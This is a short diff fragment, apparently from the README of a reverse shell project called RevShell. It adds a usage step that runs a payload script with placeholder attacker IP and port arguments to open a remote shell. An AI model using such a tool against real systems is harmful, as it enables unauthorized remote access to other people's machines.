@@ -18,4 +18,7 @@ cd RevShell
 ```bash
 python revshell.py
 ```
-
+### in another terminal
+```bash
+payload.py <ATTACKER_IP> <PORT>
+```
